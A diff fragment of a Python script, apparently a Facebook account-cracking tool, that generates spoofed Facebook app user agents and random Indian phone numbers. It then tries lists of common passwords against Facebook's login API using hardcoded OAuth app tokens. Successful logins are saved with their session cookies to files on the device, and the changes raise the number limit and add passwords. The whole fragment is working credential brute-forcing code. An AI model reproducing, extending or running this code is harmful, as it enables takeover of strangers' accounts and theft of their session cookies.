+Honor 948T
+Nokia Asha 203 Max""".splitlines()
+
+
+
+
+
+
+#CODE BY MUHAMMAD HAMMAD
+# MUGHAL ZADA
+import platform
+import random
+
+def generate_custom_user_agent():
+    android_versions = ["Android 9", "Android 10", "Android 11", "Android 12"]
+    selected_android_version = random.choice(android_versions)
+
+    manufacturers = [
+        "TECNO", "Samsung", "Xiaomi", 
+       
+    ]
+    selected_manufacturer = random.choice(manufacturers)
+
+    android_models = {
+        "TECNO": ["KE5", "Model2", "Model3"],
+        "Samsung": ["Galaxy S21", "Galaxy Note 20", "Galaxy A52"],
+        "Xiaomi": ["Redmi Note 10", "POCO X3"],
+        }
+
+    selected_model = random.choice(android_models.get(selected_manufacturer, []))
+
+    device_names = {
+        "TECNO": "TecnoDevice",
+        "Samsung": "SamsungDevice",
+        "Xiaomi": "XiaomiDevice",
+       
+    }
+
+    device_name = device_names.get(selected_manufacturer, "DefaultDevice")
+
+    build_number = random.randint(1000, 9999)
+
+    app_packages = ["com.facebook.katana", "com.facebook.ocra", "com.facebook.mlite"]
+    selected_app_package = random.choice(app_packages)
+
+    density_version = round(random.uniform(1.0, 3.0), 1)
+    height_version = random.randint(500, 2000)
+    width_version = random.randint(300, 1500)
+
+    user_agent = (
+        f"Dalvik/2.1.0 (Linux; U; {selected_android_version} Build/{build_number}; {selected_manufacturer} {selected_model})"
+        f" [FBAN/{random.randint(100, 999)}.{random.randint(1, 9)}.{random.randint(0, 9)}.0;FBBV/{random.randint(100000000, 999999999)};FBRV/{random.randint(0, 9)};"
+        f"{selected_app_package};FBLC/en_US;FBMF/{selected_manufacturer};FBBD/{selected_manufacturer};FBDV/{selected_model};"
+        f"FBSV/{random.randint(8, 12)};FBCA/armeabi-v7a:armeabi;FBDM/{{density={density_version},width={width_version},height={height_version}}};FB_FW/{random.randint(1, 3)};]"
+    )
+
+    return user_agent
+
+# Example usage
+custom_user_agent = generate_custom_user_agent()
+#print(custom_user_agent)
+
+
+
+
 
 ok = []
 cp = []
@@ -1891,7 +2201,7 @@ class crack:
         sys.stdout.flush()
         for pw in __juts__:
             try:
-                ua = random.choice(ugenn)
+                ua = random.choice(ugen2)
                 ses = requests.Session()
                 hiii = {
                     "Host": _jat,
@@ -2193,6 +2503,7 @@ class crack:
                 android_version=str(random.randrange(5,13))
                 sm=['GT-', 'SM-']
                 uo=[2,3,4]
+                ua_string=random.choice(ugen)
                 b=str(random.choice(string.ascii_uppercase))
                 gtt = random.choice(sm)+b+str(''.join(random.choice(string.digits) for _ in range(random.choice(uo)))+str(random.choice(string.ascii_uppercase)))
                 gttt=str(random.choice(string.ascii_uppercase))+str(random.randrange(11,99))+str(''.join(random.choice(string.ascii_uppercase) for _ in range(random.choice(uo))))
@@ -2236,7 +2547,7 @@ class crack:
                 head={
                     'x-fb-connection-quality':'EXCELLENT',
                     'x-fb-connection-type':'MOBILE.LTE',
-                    'user-agent': GS(),
+                    'user-agent':GS(),
                     'x-tigon-is-retry':'False',
                     'x-fb-http-engine':'Liger',
                     'x-fb-client-ip':'True',
@@ -2331,7 +2642,7 @@ class crack:
 
     def __mmb9__(self,user,__juts__,_jat):
         global ok,cp,f2,tl
-        sys.stdout.write(f'\r{PP}[M4] {VV}{self.loop}/{len(self.id)} OK:{len(ok)} '),
+        sys.stdout.write(f'\r{PP}[M4] {VV}{self.loop}/{len(self.id)} OK:{len(ok)} |CP:{len(cp)}{NN} '),
         sys.stdout.flush()
         for pw in __juts__:
             try:
@@ -2341,56 +2652,44 @@ class crack:
                 android_version=str(random.randrange(5,13))
                 sm=['GT-', 'SM-']
                 uo=[2,3,4]
+                ua_string=random.choice(ugen)
                 b=str(random.choice(string.ascii_uppercase))
                 gtt = random.choice(sm)+b+str(''.join(random.choice(string.digits) for _ in range(random.choice(uo)))+str(random.choice(string.ascii_uppercase)))
                 gttt=str(random.choice(string.ascii_uppercase))+str(random.randrange(11,99))+str(''.join(random.choice(string.ascii_uppercase) for _ in range(random.choice(uo))))
                 net=random.choice(['ZONG', 'Jazz'])
-                #ua_string = f'[FBAN/FB4A;FBAV/{application_version};FBBV/{application_version_code};FBDM/'+'{density=+str(density)+,width=+str(width)+,height=+str(height)+};FBLC/+str(FBLC)+;FBRV/0;FBCR/+str(FBCR)+;FBMF/+str(mixmodel)+;FBBD/+str(mixmodel)+;FBPN/+str(FBPN)+;FBDV/+str(model4)+;FBSV/+str(FBSV)+;FBOP/+str(FBOP)+;FBDM/FBCA/+str(FBCA)+:]'
-                ua_string = f'[FBAN/FB4A;FBAV/{application_version};FBBV/{application_version_code};FBDM/'+'{density=2.5,width=720,height=1280};FBLC/zh_CN;FBRV/708023560;FBCR/Sony;FBMF/Xiaomi;FBBD/iPhone;FBPN/com.facebook.katana;FBDV/Oppo_Reno_8;FBSV/11;FBOP/8;FBCA/arm64-v8a;FBSS/;]'
+                #ua_string = f'[FBAN/FB4A;FBAV/{application_version};FBBV/{application_version_code};FBDM/'+'{density=2.75,width=1080,height=2131};FBLC/en_US;FBRV/366716093;FBCR/Telenor;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 7;FBSV/10;FBBK/1;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
+                #ua_string = f'[FBAN/FB4A;FBAV/{application_version};FBBV/{application_version_code};FBDM/'+'{density=+str(density)+,width=+str(width)+,height=+str(height)+};FBLC/+str(FBLC)+;FBRV/0;FBCR/+str(FBCR)+;FBMF/+str(brand111)+;FBBD/+str(brand111)+;FBPN/+str(FBPN)+;FBDV/+str(model122)+;FBSV/+str(FBSV)+;FBOP/+str(FBOP)+;FBDM/FBCA/+str(FBCA)+:]'
+                #ua_string = f'[FBAN/FB4A;FBAV/;{application_version};FBBV/{application_version}FBDM/'+'{density=2.8,width=1080,height=2280};FBLC/en_US;FBRV/89065505;FBCR/Google;FBMF/Google;FBBD/Google;FBPN/com.facebook.katana;FBDV/Pixel 4;FBSV/11;FBOP/1;FBCA/armeabi-v7a]'
+                #ua_string = f'[FBAN/FB4A;FBAV/{application_version};FBBV/{application_version_code};FBDM/'+'{density=3.06,width=720,height=1600};FBLC/en_US;FBRV/0;FBCR/Cerillion;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/SM-A107F;FBSV/12;FBBK/1;FBOP/1;FBCA/arm64-v8a:]'
+                #ua_string = f'[FBAN/FB4A;FBAV/{application_version};FBBV/{application_version_code};FBDM/'+'{density=3.06,width=720,height=1600};FBLC/en_US;FBRV/0;FBCR/Cerillion;FBMF/Realme;FBBD/realme;FBPN/com.facebook.katana;FBDV/+str(gt)+;FBSV/12;FBBK/1;FBOP/1;FBCA/arm64-v8a:]'
+                #ua_string = f'[FBAN/FB4A;FBAV/{application_version};FBBV/{application_version_code};FBDM/'+'{density=1.5,width=1080,height=1280};FBLC/ja_JP;FBRV/930071996;FBCR/Sony;FBMF/Motorola;FBBD/Oppo;FBPN/com.facebook.katana;FBDV/Xiaomi_Mi_12;FBSV/17;FBOP/4;FBCA/armeabi;FBSS/;]'
                 device = str(uuid.uuid4())
                 adid = str(uuid.uuid4())
                 data = {
-					"adid": adid,
-					"format": "json",
-					"device_id": device,
-					"cpl": "true",
-					"enroll_misauth": "false",
-                    "family_device_id": device,
-                    "credentials_type": "device_based_login_password",
-                    "error_detail_type": "button_with_disabled",
-                    "source": "device_based_login",
-                    "email": user,
-                    "password": pw,
-                    "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
-                    "generate_session_cookies": "1",
-                    "meta_inf_fbmeta": "V2_UNTAGGED",
-                    "encrypted_msisdn": "",
-                    "advertiser_id": str(uuid.uuid4()),
-                    "currently_logged_in_userid": "0",
-                    "locale": "pk_ID",
-                    "client_country_code": "NP",
-                    "try_num":"1",
-                    "method": "auth.login",
-                    "fb_api_req_friendly_name": "authenticate",
-                    "flow": "CONTROLLER_INITIALIZATION",
-                    "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
-                    "api_key": "882a8490361da98702bf97a021ddc14d"}
-                head={'user-agent':S1(),
-                    'Content-Type': 'application/x-www-form-urlencoded',
-                    'Host': 'graph.facebook.com',
-                    'X-FB-Net-HNI': str(random.randint(20000, 40000)),
-                    'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
-                    'X-FB-Connection-Type': 'MOBILE.LTE',
-                    'X-Tigon-Is-Retry': 'False',
-                    'x-fb-session-id': 'nid=Mso5GuuBAsKF;pid=Main;tid=950;nc=7;fc=1;bc=8;cid=6193c421e6af4941fa9e41ef43438876',
-                    'x-fb-device-group': '1743',
-                    'X-FB-Friendly-Name': 'ViewerReactionsMutation',
-                    'X-FB-Request-Analytics-Tags': 'graphservice',
-                    'X-FB-HTTP-Engine': 'Liger',
-                    'X-FB-Client-IP': 'True',
-                    'X-FB-Server-Cluster': 'True',
-                    'x-fb-connection-token': '6193c421e6af4941fa9e41ef43438876',
-				}
+                    'adid':adid,
+					'format': 'json',
+					'device_id': str(uuid.uuid4()),
+					'email':user,
+					'password':pw,
+					'generate_analytics_claims': '1',
+					'credentials_type': 'password',
+					'source': 'login',
+					'error_detail_type': 'button_with_disabled',
+					'enroll_misauth': 'false',
+					'generate_session_cookies': '1',
+					'generate_machine_id': '1',
+					'fb_api_req_friendly_name': 'authenticate',}
+                head={
+                	'Accept-Encoding': 'gzip, deflate',
+					'Accept': '*/*',
+					'Connection': 'keep-alive',
+					'User-Agent': GS(),
+					'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
+					'X-FB-Friendly-Name': 'authenticate',
+					'X-FB-Connection-Type': 'unknown',
+					'Content-Type': 'application/x-www-form-urlencoded',
+					'X-FB-HTTP-Engine': 'Liger',
+					'Content-Length': '329',}
                 po = requests.post(_jat,data=data,headers=head).text
                 q = json.loads(po)
                 if 'session_key' in str(q) or 'c_user' in str(q):
@@ -2410,10 +2709,10 @@ class crack:
                         me=requests.get('https://graph.facebook.com/me?access_token='+tokic, cookies={'cookie':cokie}).json()
                         name=me['name']
                         idd=me['id']
-                        print(f"\r{HH}[OK-GSXD] {used} | {pw} {VV}  ")
-                        #print(f"\#r{HH}[#OK-GSXD] {used} | {pw} | {cokie} {VV} 			   ")
-                        open("/sdcard/GS-2X-IDS/M4- IDS/M4-GSXD_OK.TXT", "a").write(used + "|" + pw + "\n")
-                        open("/sdcard/GS-2X-IDS/M4- IDS/M4-GSXD_COKIE.TXT", "a").write(used + "|" + pw + "|" + cokie + "	\n")
+                        #print(f"\r{HH}[OK-GSXD] {used} | {pw} {VV}  ")
+                        print(f"\r{HH}[OK-GSXD] {used} | {pw} | {cokie} {VV} 			   ")
+                        open("/sdcard/GS-2X-IDS/M3- IDS/M3-GSXD_OK.TXT", "a").write(used + "|" + pw + "\n")
+                        open("/sdcard/GS-2X-IDS/M3- IDS/M3-GSXD_COKIE.TXT", "a").write(used + "|" + pw + "|" + cokie + "	\n")
                         ok.append(used + pw)
                         break
                     except KeyError:
@@ -2509,7 +2808,8 @@ class crack:
                 content_lenght = ("&").join([ "%s=%s" % (key, value) for key, value in data.items() ])
                 head = {
                 	#"User-Agent": ua["ua"],
-                    "User-Agent": "[FBAN/FBIOS;FBAV/26.0.0.11.13;FBBV/7806348;FBDV/iPhone5,2;FBMD/hone;FBSN/iPhone OS;FBSV/8.1;FBSS/2; FBCR/3DK;FBID/phone;FBLC/da_DK;FBOP/5",
+                    #"User-Agent": "[FBAN/FBIOS;FBAV/26.0.0.11.13;FBBV/7806348;FBDV/iPhone5,2;FBMD/hone;FBSN/iPhone OS;FBSV/8.1;FBSS/2; FBCR/3DK;FBID/phone;FBLC/da_DK;FBOP/5",
+                    "User-Agent": ua777,
                     "Authorization": "OAuth 6628568379|c1e620fa708a1d5696fb991c1bde5662", # --> Use App ID|Token/Sig
                     "X-FB-SIM-HNI": str(random.randint(20000, 40000)),
                     "X-FB-Net-HNI": str(random.randint(20000, 40000)),
@@ -2641,7 +2941,7 @@ class crack:
                 content_lenght = ("&").join([ "%s=%s" % (key, value) for key, value in data.items() ])
                 head = {
                 	#"User-Agent": ua["ua"],
-                    "User-Agent": "[FBAN/FB4A;FBAV/71.0.3578.141;FBBV/257460578;FBDM/{density=2.0,width=720,height=1280};FBLC/en_Us;FBRV/0;FBCR/DOCOMO;FBMF/"+deviceutt+""+devicttt0+";FBBD/Xiaomi;FBPN/"+kttjt+";FBDV/Redmi 9T NFC;FBSV/7.1.2;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
+                    "User-Agent":GS(),
                     "Authorization": "OAuth "+psggg+"", # --> Use App ID|Token/Sig
                     "X-FB-SIM-HNI": str(random.randint(20000, 40000)),
                     "X-FB-Net-HNI": str(random.randint(20000, 40000)),
@@ -2967,8 +3267,8 @@ class crack:
             print (logo4)
             print ('\033[1;33mEnter Code 3 Digit indian Code\033[0;97m')
             print (43*'-')
-            #print ('\033[1;33mExample 766,941,981,962,809,745,etc.\033[0;97m')
-            print ('\033[1;33mExample 76,94,98,96,80,74,97,etc.\033[0;97m')
+            print ('\033[1;33mExample 766,941,981,962,809,745,975,etc.\033[0;97m')
+            #print ('\033[1;33mExample 76,94,98,96,80,74,97,etc.\033[0;97m')
             print (43*'-')
             os.system('rm -rf .num.txt')
             k = '91'
@@ -2980,9 +3280,9 @@ class crack:
             try:
                 cb = int(input('\033[1;33mNumbers Limit: \033[0;97m'))
             except:
-                cb = 5000
+                cb = 50000
             for x in range(cb):
-                nmbr = ''.join(random.choice(string.digits) for _ in range(8))
+                nmbr = ''.join(random.choice(string.digits) for _ in range(7))
                 open('.num.txt', 'a').write(nmbr + '|' + '\n')
             self.id = open('.num.txt', 'r').read().splitlines()
             os.system('rm -rf .num.txt')
@@ -2993,7 +3293,7 @@ class crack:
             print ('\033[1;32m[2]Choice Password\033[0;97m')
             pas=input('\033[0;97mSelect: ')
             if pas == '1':
-                pwz=['57273200','59039200','number','57575752']
+                pwz=['57273200','59039200','number','57575752','57575759']
                 pwzz = '\n'.join(pwz)
                 pwzzz = (pwzz + '\n')
             elif pas == '2':
